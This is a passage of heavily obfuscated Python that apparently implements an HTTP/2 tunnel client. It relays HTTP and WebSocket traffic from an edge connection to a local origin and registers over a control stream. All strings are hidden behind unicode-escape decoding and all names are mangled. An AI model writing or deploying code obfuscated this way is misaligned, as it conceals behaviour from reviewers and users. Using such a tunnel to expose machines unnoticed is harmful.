            response = O0_fn_21(self.origin, request[codecs.decode('\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape')], request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')], request[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')], bytes(request[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')]))
            O0_var_739 = response[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')]
            O0_var_740 = []
            O0_var_741 = []
            for O0_var_742, O0_var_743 in O0_var_739:
                O0_var_744 = O0_var_742.lower()
                if O0_var_744 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'):
                    O0_var_741.append((O0_var_744, O0_var_743))
                if not (O0_var_744.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0069\\u006e\\u0074\\u002d', 'unicode_escape')) or O0_var_744.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d', 'unicode_escape')) or O0_var_744.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d', 'unicode_escape')) or O0_var_744.startswith(codecs.decode('\\u003a', 'unicode_escape'))) or O0_var_744 in {codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape')}:
                    O0_var_740.append((O0_var_744, O0_var_743))
            if not any((O0_var_742 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape') for O0_var_742, O0_var_745 in O0_var_740)):
                O0_var_746 = O0_fn_16(request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')])
                if O0_var_746:
                    O0_var_740.append((codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), O0_var_746))
            O0_var_747 = O0_fn_19(O0_var_740)
            O0_var_748 = 200 if response[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == 101 else response[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')]
            O0_var_749 = [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), str(O0_var_748))]
            O0_var_749.extend(O0_var_741)
            O0_var_749.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'), O0_var_747))
            O0_var_749.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u006d\\u0065\\u0074\\u0061', 'unicode_escape'), codecs.decode('\\u007b\\u0022\\u0073\\u0072\\u0063\\u0022\\u003a\\u0022\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0022\\u002c\\u0022\\u0066\\u006c\\u006f\\u0077\\u005f\\u0072\\u0061\\u0074\\u0065\\u005f\\u006c\\u0069\\u006d\\u0069\\u0074\\u0065\\u0064\\u0022\\u003a\\u0066\\u0061\\u006c\\u0073\\u0065\\u007d', 'unicode_escape')))
            self.send_headers(O0_var_738, O0_var_749)
            while True:
                O0_var_750 = response[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')].read(65536)
                if not O0_var_750:
                    self.send_data(O0_var_738, b'', True)
                    break
                self.send_data(O0_var_738, O0_var_750, False)
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0073\\u0020\\u0070\\u0072\\u006f\\u0078\\u0079\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_738, exc)
            try:
                self.send_headers(O0_var_738, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0035\\u0030\\u0032', 'unicode_escape'))], True)
            except OSError:
                pass

    def run(self):
        O0_var_751 = O0_fn_22(self.sock, 24)
        if O0_var_751 != b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n':
            raise ValueError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0064\\u0069\\u0064\\u0020\\u006e\\u006f\\u0074\\u0020\\u0073\\u0065\\u006e\\u0064\\u0020\\u0074\\u0068\\u0065\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0032\\u0020\\u0063\\u006c\\u0069\\u0065\\u006e\\u0074\\u0020\\u0070\\u0072\\u0065\\u0066\\u0061\\u0063\\u0065', 'unicode_escape'))
        self.send_frame(4, 0, 0, struct.pack(codecs.decode('\\u003e\\u0048\\u0049', 'unicode_escape'), 3, 100))
        if self.show_tunnel and (not self.tunnel_state[codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape')]):
            print(self.tunnel_url, flush=True)
            self.tunnel_state[codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape')] = True
        while not self.stopped:
            O0_var_752, O0_var_753, O0_var_754, O0_var_755 = self.read_frame()
            if O0_var_752 == 4:
                if not O0_var_753 & 1:
                    if len(O0_var_755) % 6:
                        raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0053\\u0045\\u0054\\u0054\\u0049\\u004e\\u0047\\u0053\\u0020\\u0070\\u0061\\u0079\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
                    for O0_var_756 in range(0, len(O0_var_755), 6):
                        O0_var_757, O0_var_758 = struct.unpack_from(codecs.decode('\\u003e\\u0048\\u0049', 'unicode_escape'), O0_var_755, O0_var_756)
                        if O0_var_757 == 4:
                            O0_var_759 = O0_var_758 - 65535
                            for O0_var_760 in self.stream_windows:
                                self.stream_windows[O0_var_760] = max(0, self.stream_windows[O0_var_760] + O0_var_759)
                        elif O0_var_757 == 5 and 16384 <= O0_var_758 <= 16777215:
                            self.peer_max_frame = O0_var_758
                    self.send_frame(4, 1, 0)
                continue
            if O0_var_752 == 6:
                if not O0_var_753 & 1:
                    self.send_frame(6, 1, 0, O0_var_755)
                continue
            if O0_var_752 == 8:
                if len(O0_var_755) != 4:
                    continue
                O0_var_761 = struct.unpack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_755)[0] & 2147483647
                if O0_var_754 == 0:
                    with self.window_condition:
                        self.connection_window += O0_var_761
                        self.window_condition.notify_all()
                else:
                    with self.window_condition:
                        self.stream_windows[O0_var_754] = self.stream_windows.get(O0_var_754, 65535) + O0_var_761
                        self.window_condition.notify_all()
                continue
            if O0_var_752 == 3:
                self.streams.pop(O0_var_754, None)
                continue
            if O0_var_752 == 7:
                break
            if O0_var_752 == 1:
                O0_var_762 = self.read_headers(O0_var_753, O0_var_754, O0_var_755)
                self.stream_windows.setdefault(O0_var_754, 65535)
                self.handle_headers(O0_var_754, O0_var_753, O0_var_762)
                continue
            if O0_var_752 == 0:
                self.handle_data(O0_var_754, O0_var_753, O0_var_755)
                continue

    def handle_headers(self, O0_var_763, O0_var_764, headers):
        O0_var_765 = {}
        for O0_var_766, O0_var_767 in headers:
            if O0_var_766.startswith(codecs.decode('\\u003a', 'unicode_escape')):
                O0_var_765[O0_var_766] = O0_var_767
            else:
                O0_var_765[O0_var_766.lower()] = O0_var_767
        O0_var_768 = O0_var_765.get(CONTROL_HEADER, codecs.decode('', 'unicode_escape')).strip().lower()
        if O0_var_768 == CONTROL_STREAM:
            self.open_control(O0_var_763)
            if O0_var_764 & 1:
                self.control.finished = True
            return
        request = {codecs.decode('\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'): O0_var_765.get(codecs.decode('\\u003a\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'), codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape')), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_765.get(codecs.decode('\\u003a\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u002f', 'unicode_escape')), codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'): O0_var_765.get(codecs.decode('\\u003a\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'): [(O0_var_766, O0_var_767) for O0_var_766, O0_var_767 in headers if not O0_var_766.startswith(codecs.decode('\\u003a', 'unicode_escape'))], codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): bytearray(), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'): O0_var_768, codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'): O0_var_768 == codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape') or O0_var_765.get(codecs.decode('\\u003a\\u0070\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c', 'unicode_escape'), codecs.decode('', 'unicode_escape')).lower() == codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'), codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape'): bool(O0_var_764 & 1), codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape'): False}
        self.streams[O0_var_763] = request
        if request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')]:
            request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')] = WebSocketProxy(self, O0_var_763, request, self.origin, self.log)
            request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')].start()
        elif request[codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape')]:
            self.request_finished(O0_var_763, request)

    def handle_data(self, O0_var_769, O0_var_770, O0_var_771):
        self.send_window_update(0, len(O0_var_771))
        self.send_window_update(O0_var_769, len(O0_var_771))
        if self.control is not None and self.control.stream_id == O0_var_769:
            self.control.feed(O0_var_771)
            if O0_var_770 & 1:
                self.control.finished = True
            return
        request = self.streams.get(O0_var_769)
        if request is None:
            return
        if request.get(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')) is not None:
            request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')].feed(O0_var_771, bool(O0_var_770 & 1))
            return
        request[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')].extend(O0_var_771)
        if O0_var_770 & 1:
            request[codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape')] = True
            self.request_finished(O0_var_769, request)

class WebSocketProxy:

    def __init__(self, O0_var_772, O0_var_773, request, O0_var_774, logger):
        self.connection = O0_var_772
        self.stream_id = O0_var_773
        self.request = request
        self.origin = O0_var_774
        self.log = logger
        self.incoming = queue.Queue()
        self.stopped = threading.Event()
        self.sock = None

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def feed(self, O0_var_775, O0_var_776=False):
        if O0_var_775:
            self.incoming.put(O0_var_775)
        if O0_var_776:
            self.incoming.put(None)

    def run(self):
        O0_var_777 = None
        try:
            self.sock = O0_fn_20(self.origin)
            self.send_handshake()
            response = http.client.HTTPResponse(self.sock, method=codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape'))
            response.begin()
            O0_var_778 = response.getheaders()
            O0_var_779 = []
            O0_var_780 = []
            for O0_var_781, O0_var_782 in O0_var_778:
                O0_var_783 = O0_var_781.lower()
                if O0_var_783 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'):
                    O0_var_780.append((O0_var_783, O0_var_782))
                if not (O0_var_783.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0069\\u006e\\u0074\\u002d', 'unicode_escape')) or O0_var_783.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d', 'unicode_escape')) or O0_var_783.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d', 'unicode_escape')) or O0_var_783.startswith(codecs.decode('\\u003a', 'unicode_escape'))) or O0_var_783 in {codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape')}:
                    O0_var_779.append((O0_var_783, O0_var_782))
            O0_var_784 = O0_fn_19(O0_var_779)
            O0_var_785 = 200 if response.status == 101 else response.status
            O0_var_786 = [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), str(O0_var_785))]
            O0_var_786.extend(O0_var_780)
            O0_var_786.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'), O0_var_784))
            O0_var_786.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u006d\\u0065\\u0074\\u0061', 'unicode_escape'), codecs.decode('\\u007b\\u0022\\u0073\\u0072\\u0063\\u0022\\u003a\\u0022\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0022\\u002c\\u0022\\u0066\\u006c\\u006f\\u0077\\u005f\\u0072\\u0061\\u0074\\u0065\\u005f\\u006c\\u0069\\u006d\\u0069\\u0074\\u0065\\u0064\\u0022\\u003a\\u0066\\u0061\\u006c\\u0073\\u0065\\u007d', 'unicode_escape')))
            self.connection.send_headers(self.stream_id, O0_var_786)
            O0_var_777 = threading.Thread(target=self.write_to_origin, daemon=True)
            O0_var_777.start()
            while not self.stopped.is_set():
                O0_var_787 = self.sock.recv(65536)
                if not O0_var_787:
                    break
                self.connection.send_data(self.stream_id, O0_var_787, False)
            self.connection.send_data(self.stream_id, b'', True)
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u0020\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), self.stream_id, exc)
            try:
                self.connection.send_headers(self.stream_id, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0035\\u0030\\u0032', 'unicode_escape'))], True)
            except OSError:
                pass
        finally:
            self.stopped.set()
            self.incoming.put(None)
            if self.sock is not None:
                try:
                    self.sock.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                try:
                    self.sock.close()
                except OSError:
                    pass

    def send_handshake(self):
        O0_var_788 = urlsplit(self.origin)
        O0_var_789 = self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')] if self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')].startswith(codecs.decode('\\u002f', 'unicode_escape')) else codecs.decode('\\u002f', 'unicode_escape') + self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')]
        O0_var_790 = [codecs.decode('\\u0047\\u0045\\u0054\\u0020\\u0025\\u0073\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0031\\u002e\\u0031', 'unicode_escape') % O0_var_789]
        O0_var_791 = False
        O0_var_792 = False
        O0_var_793 = False
        for O0_var_794, O0_var_795 in self.request[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')]:
            O0_var_796 = O0_var_794.lower()
            if O0_var_796 in {codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape')}:
                continue
            if O0_var_796 == codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u006b\\u0065\\u0079', 'unicode_escape'):
                O0_var_791 = True
            elif O0_var_796 == codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'):
                O0_var_792 = True
            elif O0_var_796 == codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e', 'unicode_escape'):
                O0_var_793 = True
            O0_var_790.append(codecs.decode('\\u0025\\u0073\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % (O0_var_794, O0_var_795))
        O0_var_797 = O0_var_788.netloc
        O0_var_790.append(codecs.decode('\\u0048\\u006f\\u0073\\u0074\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_797)
        if not O0_var_793 and self.request.get(codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape')):
            O0_var_790.append(codecs.decode('\\u004f\\u0072\\u0069\\u0067\\u0069\\u006e\\u003a\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0025\\u0073', 'unicode_escape') % self.request[codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape')])
        if not O0_var_791:
            O0_var_790.append(codecs.decode('\\u0053\\u0065\\u0063\\u002d\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u004b\\u0065\\u0079\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % base64.b64encode(secrets.token_bytes(16)).decode())
        if not O0_var_792:
            O0_var_790.append(codecs.decode('\\u0053\\u0065\\u0063\\u002d\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0056\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e\\u003a\\u0020\\u0031\\u0033', 'unicode_escape'))
        O0_var_790.append(codecs.decode('\\u0043\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u003a\\u0020\\u0055\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'))
        O0_var_790.append(codecs.decode('\\u0055\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065\\u003a\\u0020\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'))
        self.sock.sendall((codecs.decode('\\u000d\\u000a', 'unicode_escape').join(O0_var_790) + codecs.decode('\\u000d\\u000a\\u000d\\u000a', 'unicode_escape')).encode(codecs.decode('\\u0069\\u0073\\u006f\\u002d\\u0038\\u0038\\u0035\\u0039\\u002d\\u0031', 'unicode_escape')))

    def write_to_origin(self):
        while not self.stopped.is_set():
            O0_var_798 = self.incoming.get()
            if O0_var_798 is None:
                return
            try:
                self.sock.sendall(O0_var_798)
            except OSError:
                self.stopped.set()
                return

class ControlStream:

    def __init__(self, O0_var_799, O0_var_800, logger):
        self.connection = O0_var_799
        self.stream_id = O0_var_800
        self.log = logger
        self.buffer = b''
        self.finished = False

    def start(self, O0_var_801, O0_var_802, O0_var_803, O0_var_804):
        self.connection.send_data(self.stream_id, O0_fn_10(0), False)
        self.connection.send_data(self.stream_id, O0_fn_11(1, 0, O0_var_801, O0_var_802, O0_var_803, O0_var_804), False)

    def feed(self, O0_var_805):
        self.buffer += O0_var_805
        O0_var_806, self.buffer = O0_fn_12(self.buffer)
        for O0_var_807 in O0_var_806:
            try:
                O0_var_808 = O0_fn_15(O0_var_807)
                if O0_var_808[codecs.decode('\\u006f\\u006b', 'unicode_escape')]:
                    self.log.info(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0065\\u0072\\u0065\\u0064\\u0020\\u0061\\u0074\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_808.get(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape')))
                    self.connection.registered = True
                else:
                    self.log.warning(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_808.get(codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')))
                    self.connection.registration_failed = True
                    self.connection.stopped = True
            except Exception as exc:
                self.log.debug(codecs.decode('\\u0069\\u0067\\u006e\\u006f\\u0072\\u0069\\u006e\\u0067\\u0020\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u0020\\u0052\\u0050\\u0043\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)

def O0_fn_19(headers):
    O0_var_809 = []
    for O0_var_810, O0_var_811 in headers:
        O0_var_812 = base64.b64encode(O0_var_810.encode()).decode().rstrip(codecs.decode('\\u003d', 'unicode_escape'))
        O0_var_813 = base64.b64encode(O0_var_811.encode()).decode().rstrip(codecs.decode('\\u003d', 'unicode_escape'))
        O0_var_809.append(O0_var_812 + codecs.decode('\\u003a', 'unicode_escape') + O0_var_813)
    return codecs.decode('\\u003b', 'unicode_escape').join(O0_var_809)

def O0_fn_20(O0_var_814):
    O0_var_815 = urlsplit(O0_var_814)
    if O0_var_815.scheme not in {codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')} or not O0_var_815.hostname:
        raise ValueError(codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u006d\\u0075\\u0073\\u0074\\u0020\\u0062\\u0065\\u0020\\u0061\\u006e\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0020\\u006f\\u0072\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0020\\u0055\\u0052\\u004c', 'unicode_escape'))
    O0_var_816 = O0_var_815.port or (443 if O0_var_815.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape') else 80)
    O0_var_817 = socket.create_connection((O0_var_815.hostname, O0_var_816), timeout=30)
    if O0_var_815.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape'):
        O0_var_818 = ssl.create_default_context()
        O0_var_817 = O0_var_818.wrap_socket(O0_var_817, server_hostname=O0_var_815.hostname)
    O0_var_817.settimeout(None)
    return O0_var_817

def O0_fn_21(O0_var_819, method, O0_var_820, O0_var_821, body):
    O0_var_822 = urlsplit(O0_var_819)
    if O0_var_822.scheme not in {codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')} or not O0_var_822.hostname:
        raise ValueError(codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u006d\\u0075\\u0073\\u0074\\u0020\\u0062\\u0065\\u0020\\u0061\\u006e\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0020\\u006f\\u0072\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0020\\u0055\\u0052\\u004c', 'unicode_escape'))
    O0_var_823 = O0_var_822.port or (443 if O0_var_822.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape') else 80)
    O0_var_824 = http.client.HTTPConnection(O0_var_822.hostname, O0_var_823, timeout=30)
    if O0_var_822.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape'):
        O0_var_824 = http.client.HTTPSConnection(O0_var_822.hostname, O0_var_823, timeout=30)
    O0_var_825 = {}
    for O0_var_826, O0_var_827 in O0_var_821:
        O0_var_828 = O0_var_826.lower()
        if O0_var_828 in {codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')}:
            continue
        O0_var_825[O0_var_826] = O0_var_827
    O0_var_825[codecs.decode('\\u0048\\u006f\\u0073\\u0074', 'unicode_escape')] = O0_var_822.netloc
    if body:
        O0_var_825[codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u004c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] = str(len(body))
    O0_var_829 = O0_var_820 if O0_var_820.startswith(codecs.decode('\\u002f', 'unicode_escape')) else codecs.decode('\\u002f', 'unicode_escape') + O0_var_820
    O0_var_824.request(method, O0_var_829, body=body or None, headers=O0_var_825)
    response = O0_var_824.getresponse()
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): response.status, codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'): response.getheaders(), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): response}

def O0_fn_22(O0_var_830, O0_var_831):
    O0_var_832 = []
    O0_var_833 = O0_var_831
    while O0_var_833:
        O0_var_834 = O0_var_830.recv(O0_var_833)
